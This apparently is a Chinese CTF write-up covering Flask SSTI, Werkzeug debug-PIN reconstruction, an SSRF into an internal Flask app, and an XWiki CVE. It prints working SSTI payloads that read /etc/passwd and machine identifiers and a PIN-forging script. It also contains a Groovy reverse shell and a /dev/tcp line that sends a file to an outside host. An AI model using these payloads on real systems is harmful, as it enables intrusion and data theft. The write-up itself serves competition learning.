<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hello 11:devices:&#x2F;docker&#x2F;62e0150f561bf7328b25f2d50a74e356214194f8e92617818bf90a7b08337c8f 10:blkio:&#x2F;docker&#x2F;62e0150f561bf7328b25f2d50a74e356214194f8e92617818bf90a7b08337c8f 9:cpuset:&#x2F;docker&#x2F;62e0150f561bf7328b25f2d50a74e356214194f8e92617818bf90a7b08337c8f 8:freezer:&#x2F;docker&#x2F;62e0150f561bf7328b25f2d50a74e356214194f8e92617818bf90a7b08337c8f 7:pids:&#x2F;docker&#x2F;62e0150f561bf7328b25f2d50a74e356214194f8e92617818bf90a7b08337c8f 6:hugetlb:&#x2F;docker&#x2F;62e0150f561bf7328b25f2d50a74e356214194f8e92617818bf90a7b08337c8f 5:net_prio,net_cls:&#x2F;docker&#x2F;62e0150f561bf7328b25f2d50a74e356214194f8e92617818bf90a7b08337c8f 4:perf_event:&#x2F;docker&#x2F;62e0150f561bf7328b25f2d50a74e356214194f8e92617818bf90a7b08337c8f 3:memory:&#x2F;docker&#x2F;62e0150f561bf7328b25f2d50a74e356214194f8e92617818bf90a7b08337c8f 2:cpuacct,cpu:&#x2F;docker&#x2F;62e0150f561bf7328b25f2d50a74e356214194f8e92617818bf90a7b08337c8f 1:name&#x3D;systemd:&#x2F;docker&#x2F;62e0150f561bf7328b25f2d50a74e356214194f8e92617818bf90a7b08337c8f !</span><br></pre></td></tr></table></figure>

<p><code>/usr/local/lib/python3.6/dist-packages/werkzeug/debug/__init__.py </code>  <code>48-76</code>行</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_machine_id</span>():</span></span><br><span class="line">    <span class="keyword">global</span> _machine_id</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> _machine_id <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">return</span> _machine_id</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_generate</span>():</span></span><br><span class="line">        linux = <span class="string">b&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># machine-id is stable across boots, boot_id is not.</span></span><br><span class="line">        <span class="keyword">for</span> filename <span class="keyword">in</span> <span class="string">&quot;/etc/machine-id&quot;</span>, <span class="string">&quot;/proc/sys/kernel/random/boot_id&quot;</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">with</span> open(filename, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                    value = f.readline().strip()</span><br><span class="line">            <span class="keyword">except</span> IOError:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> value:</span><br><span class="line">                linux += value</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># Containers share the same machine id, add some cgroup</span></span><br><span class="line">        <span class="comment"># information. This is used outside containers too but should be</span></span><br><span class="line">        <span class="comment"># relatively stable across boots.</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">with</span> open(<span class="string">&quot;/proc/self/cgroup&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                linux += f.readline().strip().rpartition(<span class="string">b&quot;/&quot;</span>)[<span class="number">2</span>]</span><br><span class="line">        <span class="keyword">except</span> IOError:</span><br><span class="line">            <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>

<p>注意此题和[GYCTF2020]FlaskApp的主要区别在于<code>/etc/machine-id</code>存在,其他一样</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">linux =  get(/etc/machine-id) + get(/proc/self/cgroup) </span><br></pre></td></tr></table></figure>

<ul>
<li>MAC</li>
</ul>
<p>注意MAC值是会变化的</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name=&#123;&#123;().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">127</span>].__init__.__globals__.__builtins__[<span class="string">&quot;open&quot;</span>](<span class="string">&quot;/sys/class/net/eth0/address&quot;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hello <span class="number">02</span>:<span class="number">42</span>:ac:<span class="number">14</span>:<span class="number">00</span>:<span class="number">07</span> !</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(int(<span class="string">&#x27;0242ac140007&#x27;</span>,<span class="number">16</span>))</span><br><span class="line"><span class="number">2485378088967</span></span><br></pre></td></tr></table></figure>

<ul>
<li>username</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name&#x3D;&#123;&#123;().__class__.__bases__[0].__subclasses__()[127].__init__.__globals__.__builtins__[&quot;open&quot;](&quot;&#x2F;etc&#x2F;passwd&quot;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hello root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash daemon:x:1:1:daemon:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;sbin&#x2F;nologin bin:x:2:2:bin:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin sys:x:3:3:sys:&#x2F;dev:&#x2F;usr&#x2F;sbin&#x2F;nologin sync:x:4:65534:sync:&#x2F;bin:&#x2F;bin&#x2F;sync games:x:5:60:games:&#x2F;usr&#x2F;games:&#x2F;usr&#x2F;sbin&#x2F;nologin man:x:6:12:man:&#x2F;var&#x2F;cache&#x2F;man:&#x2F;usr&#x2F;sbin&#x2F;nologin lp:x:7:7:lp:&#x2F;var&#x2F;spool&#x2F;lpd:&#x2F;usr&#x2F;sbin&#x2F;nologin mail:x:8:8:mail:&#x2F;var&#x2F;mail:&#x2F;usr&#x2F;sbin&#x2F;nologin news:x:9:9:news:&#x2F;var&#x2F;spool&#x2F;news:&#x2F;usr&#x2F;sbin&#x2F;nologin uucp:x:10:10:uucp:&#x2F;var&#x2F;spool&#x2F;uucp:&#x2F;usr&#x2F;sbin&#x2F;nologin proxy:x:13:13:proxy:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin www-data:x:33:33:www-data:&#x2F;var&#x2F;www:&#x2F;usr&#x2F;sbin&#x2F;nologin backup:x:34:34:backup:&#x2F;var&#x2F;backups:&#x2F;usr&#x2F;sbin&#x2F;nologin list:x:38:38:Mailing List Manager:&#x2F;var&#x2F;list:&#x2F;usr&#x2F;sbin&#x2F;nologin irc:x:39:39:ircd:&#x2F;var&#x2F;run&#x2F;ircd:&#x2F;usr&#x2F;sbin&#x2F;nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):&#x2F;var&#x2F;lib&#x2F;gnats:&#x2F;usr&#x2F;sbin&#x2F;nologin nobody:x:65534:65534:nobody:&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin _apt:x:100:65534::&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin messagebus:x:101:101::&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin !</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">name=&#123;&#123;().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">127</span>].__init__.__globals__[<span class="string">&quot;geteuid&quot;</span>]()&#125;&#125;</span><br><span class="line"></span><br><span class="line">hello <span class="number">0</span>!</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>变量名</th>
<th>变量值</th>
</tr>
</thead>
<tbody><tr>
<td>当前计算机用户名</td>
<td>root</td>
</tr>
<tr>
<td>modname</td>
<td>flask.app</td>
</tr>
<tr>
<td>getattr(app, “__name__”, app.__class__.__name__)</td>
<td>Flask</td>
</tr>
<tr>
<td>str(uuid.getnode())</td>
<td>a8eb6cac33e701ae867269db5ce80e7f62e0150f561bf7328b25f2d50a74e356214194f8e92617818bf90a7b08337c8f</td>
</tr>
<tr>
<td>get_machine_id()</td>
<td>2485378088970</td>
</tr>
<tr>
<td>绝对路径</td>
<td>/usr/local/lib/python3.7/dist-packages/flask/app.py</td>
</tr>
</tbody></table>
<ul>
<li>PIN -  payload:</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line">probably_public_bits = [</span><br><span class="line">    <span class="string">&#x27;root&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;flask.app&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Flask&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;/usr/local/lib/python3.7/dist-packages/flask/app.py&#x27;</span>,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">private_bits = [</span><br><span class="line">    <span class="string">&#x27;2485378088968&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;a8eb6cac33e701ae867269db5ce80e7f62e0150f561bf7328b25f2d50a74e356214194f8e92617818bf90a7b08337c8f&#x27;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">h = hashlib.md5()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> isinstance(bit, str):</span><br><span class="line">        bit = bit.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b&#x27;cookiesalt&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cookie_name = <span class="string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line"></span><br><span class="line">num = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    h.update(<span class="string">b&#x27;pinsalt&#x27;</span>)</span><br><span class="line">    num = (<span class="string">&#x27;%09d&#x27;</span> % int(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">rv =<span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> len(num) % group_size == <span class="number">0</span>:</span><br><span class="line">            rv = <span class="string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">                          <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">0</span>, len(num), group_size))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        rv = num</span><br><span class="line"></span><br><span class="line">print(rv)</span><br></pre></td></tr></table></figure>

<ul>
<li>shell</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> os</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>os.popen(<span class="string">&#x27;ls /&#x27;</span>).read()</span><br><span class="line"><span class="string">&#x27;bin\nboot\ndev\netc\nflag\nhome\nlib\nlib64\nmedia\nmnt\nopt\nproc\nroot\nrun\nsbin\nsrv\nsys\ntmp\nusr\nvar\n&#x27;</span>  </span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>os.popen(<span class="string">&#x27;cat /flag&#x27;</span>).read()</span><br><span class="line"><span class="string">&#x27;GACTF&#123;fac9165b6a2b5ac8bd3b99fad0619366&#125;\n&#x27;</span></span><br></pre></td></tr></table></figure>

<p>另一种 payload:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name=&#123;&#123;[].__class__.__base__.__subclasses__()[<span class="number">127</span>].__init__.__globals__.__builtins__[<span class="string">&quot;open&quot;</span>](<span class="string">&quot;fla&quot;</span>.join(<span class="string">&quot;/g&quot;</span>)).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<h3 id="EZFLASK"><a href="#EZFLASK" class="headerlink" title="EZFLASK"></a><strong>EZFLASK</strong></h3><p><del>伪</del>源代码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> waf <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&#x27;/ctfhint&#x27;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ctf</span>():</span></span><br><span class="line">    hint =xxxx <span class="comment"># hints</span></span><br><span class="line">    trick = xxxx <span class="comment"># trick</span></span><br><span class="line">    <span class="keyword">return</span> trick</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&#x27;/&#x27;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="comment"># app.txt</span></span><br><span class="line"><span class="meta">@app.route(&#x27;/eval&#x27;, methods=[&quot;POST&quot;])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">my_eval</span>():</span></span><br><span class="line">    <span class="comment"># post eval</span></span><br><span class="line"><span class="meta">@app.route(xxxxxx, methods=[&quot;POST&quot;]) # Secret</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">admin</span>():</span></span><br><span class="line">    <span class="comment"># admin requests</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">8080</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\WINDOWS\System32&gt; curl.exe <span class="literal">-X</span> POST http://<span class="number">149.28</span>.<span class="number">226.175</span>:<span class="number">10000</span>/eval <span class="literal">-d</span>  <span class="string">&#x27;eval=ctf.__globals__&#x27;</span></span><br><span class="line">&#123;<span class="string">&#x27;my_eval&#x27;</span>: &lt;<span class="function"><span class="keyword">function</span> <span class="title">my_eval</span> <span class="title">at</span> <span class="title">0x7ff4f6b29dd0</span>&gt;, &#x27;<span class="title">app</span>&#x27;: &lt;<span class="title">Flask</span> &#x27;<span class="title">app_1</span>&#x27;&gt;, &#x27;<span class="title">waf_eval</span>&#x27;: &lt;<span class="keyword">function</span> <span class="title">waf_eval</span> <span class="title">at</span> <span class="title">0x7ff4f6b29c50</span>&gt;, &#x27;<span class="title">admin</span>&#x27;: &lt;<span class="keyword">function</span> <span class="title">admin</span> <span class="title">at</span> <span class="title">0x7ff4f6a73650</span>&gt;, &#x27;<span class="title">index</span>&#x27;: &lt;<span class="keyword">function</span> <span class="title">index</span> <span class="title">at</span> <span class="title">0x7ff4f6b29d50</span>&gt;, &#x27;<span class="title">waf_ip</span>&#x27;: &lt;<span class="keyword">function</span> <span class="title">waf_ip</span> <span class="title">at</span> <span class="title">0x7ff4f6b29b50</span>&gt;, &#x27;<span class="title">__builtins__</span>&#x27;: &lt;<span class="title">module</span> &#x27;<span class="title">__builtin__</span>&#x27; <span class="params">(built-in)</span>&gt;, &#x27;<span class="title">admin_route</span>&#x27;: &#x27;/<span class="title">h4rdt0f1nd_9792uagcaca00qjaf</span>&#x27;, &#x27;<span class="title">__file__</span>&#x27;: &#x27;<span class="title">app_1</span>.<span class="title">py</span>&#x27;, &#x27;<span class="title">request</span>&#x27;: &lt;<span class="title">Request</span> &#x27;<span class="title">http</span>://<span class="title">149</span>.<span class="title">28</span>.<span class="title">226</span>.<span class="title">175</span>:<span class="title">10000</span>/<span class="title">eval</span>&#x27; [<span class="title">POST</span>]&gt;, &#x27;<span class="title">__package__</span>&#x27;: <span class="title">None</span>, &#x27;<span class="title">Flask</span>&#x27;: &lt;<span class="title">class</span> &#x27;<span class="title">flask</span>.<span class="title">app</span>.<span class="title">Flask</span>&#x27;&gt;, &#x27;<span class="title">ctf</span>&#x27;: &lt;<span class="keyword">function</span> <span class="title">ctf</span> <span class="title">at</span> <span class="title">0x7ff4f6b29cd0</span>&gt;, &#x27;<span class="title">waf_path</span>&#x27;: &lt;<span class="keyword">function</span> <span class="title">waf_path</span> <span class="title">at</span> <span class="title">0x7ff4f6b29bd0</span>&gt;, &#x27;<span class="title">time</span>&#x27;: &lt;<span class="title">module</span> &#x27;<span class="title">time</span>&#x27; <span class="title">from</span> &#x27;/<span class="title">usr</span>/<span class="title">local</span>/<span class="title">lib</span>/<span class="title">python2</span>.<span class="title">7</span>/<span class="title">lib-dynload</span>/<span class="title">time</span>.<span class="title">so</span>&#x27;&gt;, &#x27;<span class="title">__name__</span>&#x27;: &#x27;<span class="title">__main__</span>&#x27;, &#x27;<span class="title">requests</span>&#x27;: &lt;<span class="title">module</span> &#x27;<span class="title">requests</span>&#x27; <span class="title">from</span> &#x27;/<span class="title">usr</span>/<span class="title">local</span>/<span class="title">lib</span>/<span class="title">python2</span>.<span class="title">7</span>/<span class="title">site-packages</span>/<span class="title">requests</span>/<span class="title">__init__</span>.<span class="title">pyc</span>&#x27;&gt;, &#x27;<span class="title">__doc__</span>&#x27;: <span class="title">None</span>&#125;</span></span><br></pre></td></tr></table></figure>

<ul>
<li><code>/h4rdt0f1nd_9792uagcaca00qjaf</code></li>
</ul>
<p><a target="_blank" rel="noopener" href="https://www.secpulse.com/archives/65832.html">https://www.secpulse.com/archives/65832.html</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">curl.exe -X POST http:&#x2F;&#x2F;149.28.226.175:10000&#x2F;h4rdt0f1nd_9792uagcaca00qjaf -d  &#39;ip&#x3D;127.1.1.1&amp;port&#x3D;5000&amp;path&#x3D;&#39;</span><br><span class="line"></span><br><span class="line">from xxxx import flag</span><br><span class="line">app &#x3D; flask.Flask(__name__)</span><br><span class="line">app.config[&#39;FLAG&#39;] &#x3D; flag</span><br><span class="line">@app.route(&#39;&#x2F;&#39;)</span><br><span class="line">def index():</span><br><span class="line">    return open(&#39;app.txt&#39;).read()</span><br><span class="line">@app.route(&#39;&#x2F;&lt;path:hack&gt;&#39;)</span><br><span class="line">def hack(hack):</span><br><span class="line">    return flask.render_template_string(hack)</span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    app.run(host&#x3D;&#39;0.0.0.0&#39;,port&#x3D;5000)</span><br></pre></td></tr></table></figure>

<p>payload:</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ip=<span class="number">127.1</span><span class="number">.1</span><span class="number">.1</span>&amp;path=&#123;&#123;url_for.__globals__[<span class="string">&#x27;current_app&#x27;</span>].__dict__&#125;&#125;&amp;port=<span class="number">5000</span></span><br><span class="line"></span><br><span class="line">&#123;&#x27;subdomain_matching&#x27;: False, &#x27;error_handler_spec&#x27;: &#123;&#125;, &#x27;_before_request_lock&#x27;: &lt;thread.lock object at 0x7fca8afb0410&gt;, &#x27;jinja_env&#x27;: &lt;flask.templating.Environment object at 0x7fca8b1b83d0&gt;, &#x27;before_request_funcs&#x27;: &#123;&#125;, &#x27;teardown_appcontext_funcs&#x27;: [], &#x27;shell_context_processors&#x27;: [], &#x27;after_request_funcs&#x27;: &#123;&#125;, &#x27;cli&#x27;: &lt;AppGroup app_2&gt;, &#x27;_blueprint_order&#x27;: [], &#x27;before_first_request_funcs&#x27;: [], &#x27;view_functions&#x27;: &#123;&#x27;index&#x27;: &lt;function index at 0x7fca8c1cae50&gt;, &#x27;static&#x27;: &lt;bound method Flask.send_static_file of &lt;Flask &#x27;app_2&#x27;&gt;&gt;, &#x27;hack&#x27;: &lt;function hack at 0x7fca8b1fcd50&gt;&#125;, &#x27;instance_path&#x27;: &#x27;/app/web2tokensadfafqgqgfaosvbs/instance&#x27;, &#x27;teardown_request_funcs&#x27;: &#123;&#125;, &#x27;url_value_preprocessors&#x27;: &#123;&#125;, &#x27;config&#x27;: &lt;Config &#123;&#x27;JSON_AS_ASCII&#x27;: True, &#x27;USE_X_SENDFILE&#x27;: False, &#x27;SESSION_COOKIE_SECURE&#x27;: False, &#x27;SESSION_COOKIE_PATH&#x27;: None, &#x27;SESSION_COOKIE_DOMAIN&#x27;: None, &#x27;SESSION_COOKIE_NAME&#x27;: &#x27;session&#x27;, &#x27;MAX_COOKIE_SIZE&#x27;: 4093, &#x27;SESSION_COOKIE_SAMESITE&#x27;: None, &#x27;PROPAGATE_EXCEPTIONS&#x27;: None, &#x27;ENV&#x27;: &#x27;production&#x27;, &#x27;DEBUG&#x27;: False, &#x27;SECRET_KEY&#x27;: None, &#x27;EXPLAIN_TEMPLATE_LOADING&#x27;: False, &#x27;MAX_CONTENT_LENGTH&#x27;: None, &#x27;APPLICATION_ROOT&#x27;: &#x27;/&#x27;, &#x27;SERVER_NAME&#x27;: None, &#x27;FLAG&#x27;: &#x27;GACTF&#123;wuhUwuHu_a1rpl4n3&#125;&#x27;, &#x27;PREFERRED_URL_SCHEME&#x27;: &#x27;http&#x27;, &#x27;JSONIFY_PRETTYPRINT_REGULAR&#x27;: False, &#x27;TESTING&#x27;: False, &#x27;PERMANENT_SESSION_LIFETIME&#x27;: datetime.timedelta(31), &#x27;TEMPLATES_AUTO_RELOAD&#x27;: None, &#x27;TRAP_BAD_REQUEST_ERRORS&#x27;: None, &#x27;JSON_SORT_KEYS&#x27;: True, &#x27;JSONIFY_MIMETYPE&#x27;: &#x27;application/json&#x27;, &#x27;SESSION_COOKIE_HTTPONLY&#x27;: True, &#x27;SEND_FILE_MAX_AGE_DEFAULT&#x27;: datetime.timedelta(0, 43200), &#x27;PRESERVE_CONTEXT_ON_EXCEPTION&#x27;: None, &#x27;SESSION_REFRESH_EACH_REQUEST&#x27;: True, &#x27;TRAP_HTTP_EXCEPTIONS&#x27;: False&#125;&gt;, &#x27;_static_url_path&#x27;: None, &#x27;template_context_processors&#x27;: &#123;None: [&lt;function _default_template_ctx_processor at 0x7fca8b1fc550&gt;]&#125;, &#x27;template_folder&#x27;: &#x27;templates&#x27;, &#x27;blueprints&#x27;: &#123;&#125;, &#x27;url_map&#x27;: Map([&lt;Rule &#x27;/&#x27; (HEAD, OPTIONS, GET) -&gt; index&gt;, &lt;Rule &#x27;/static/&lt;filename&gt;&#x27; (HEAD, OPTIONS, GET) -&gt; static&gt;, &lt;Rule &#x27;/&lt;hack&gt;&#x27; (HEAD, OPTIONS, GET) -&gt; hack&gt;]), &#x27;name&#x27;: &#x27;app_2&#x27;, &#x27;_got_first_request&#x27;: True, &#x27;import_name&#x27;: &#x27;__main__&#x27;, &#x27;root_path&#x27;: &#x27;/app/web2tokensadfafqgqgfaosvbs&#x27;, &#x27;_static_folder&#x27;: &#x27;static&#x27;, &#x27;extensions&#x27;: &#123;&#125;, &#x27;url_default_functions&#x27;: &#123;&#125;, &#x27;url_build_error_handlers&#x27;: []&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>….我 flask  好像 又有点忘了….记得归纳</p>
<p>参考</p>
<p><a target="_blank" rel="noopener" href="https://www.mi1k7ea.com/2019/06/02/%E6%B5%85%E6%9E%90Python-Flask-SSTI/">https://www.mi1k7ea.com/2019/06/02/%E6%B5%85%E6%9E%90Python-Flask-SSTI/</a></p>
<h3 id="xwiki"><a href="#xwiki" class="headerlink" title="xwiki"></a>xwiki</h3><p> CVE-2020-11057</p>
<p><a target="_blank" rel="noopener" href="https://jira.xwiki.org/browse/XWIKI-16960">https://jira.xwiki.org/browse/XWIKI-16960</a></p>
<figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">String host=<span class="string">&quot;x.x.x.x&quot;</span>;</span><br><span class="line"><span class="keyword">int</span> port=<span class="number">8080</span>;</span><br><span class="line">String cmd=<span class="string">&quot;/bin/bash&quot;</span>;</span><br><span class="line">Process p=<span class="keyword">new</span> ProcessBuilder(cmd).redirectErrorStream(<span class="literal">true</span>).start();Socket s=<span class="keyword">new</span> Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();<span class="keyword">while</span>(!s.isClosed())&#123;<span class="keyword">while</span>(pi.available()&gt;<span class="number">0</span>)so.write(pi.read());<span class="keyword">while</span>(pe.available()&gt;<span class="number">0</span>)so.write(pe.read());<span class="keyword">while</span>(si.available()&gt;<span class="number">0</span>)po.write(si.read());so.flush();po.flush();Thread.sleep(<span class="number">50</span>);<span class="keyword">try</span> &#123;p.exitValue();<span class="keyword">break</span>;&#125;<span class="keyword">catch</span> (Exception e)&#123;&#125;&#125;;p.destroy();s.close();</span><br></pre></td></tr></table></figure>

<p>// python的socket 就是连不上。。。。</p>
<p>也可以直接将<code>readflag</code> 上传到自己主机上 <code>cat /readflag &gt; /dev/tcp/x.x.x.x/8080</code> </p>
<blockquote>
<p>那个主机上没有: nc  scp rsync</p>
</blockquote>
<p>后面是逆向,交给队友了</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0110011101100001011000110111010001100110011110110101100001010111011010010110101101101001010111110100001101010110010001010101111101110111011010010111010001101000011011110111010101110100010111110111000001100101011100100110110101101001011100110111001101101001011011110110111001011111011100110110001101110010011010010111000001110100011010010110111001100111010111110110010101111000011001010110001101110101011101000110100101101111011011100010000100100001001000010111110</span><br><span class="line"># 二进制转字符串</span><br><span class="line">gactf&#123;XWiki_CVE_without_permission_scripting_execution!!!&gt; </span><br><span class="line"># 修改</span><br><span class="line">gactf&#123;XWiki_CVE_without_permission_scripting_execution!!!&#125;</span><br></pre></td></tr></table></figure>

